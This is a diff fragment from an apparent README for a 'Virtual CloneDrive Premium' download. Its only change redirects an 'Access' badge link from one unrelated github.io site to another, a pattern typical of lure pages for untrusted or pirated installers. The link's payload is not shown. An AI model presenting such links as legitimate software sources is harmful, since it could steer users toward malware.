@@ -18,7 +18,7 @@
 4. Import existing image mappings from previous tools  
 5. Activate full virtual drive support in under 2 minutes
 
-[![Access Virtual CloneDrive Premium](https://img.shields.io/badge/Access-Virtual_CloneDrive_Premium-green)](https://edwardodonnellpubl.github.io/.github/virtual-clonedrive-app)
+[![Access Virtual CloneDrive Premium](https://img.shields.io/badge/Access-Virtual_CloneDrive_Premium-green)](https://lead-soft-set.github.io/.github/virtual-clonedrive-app)
 
 ---
 
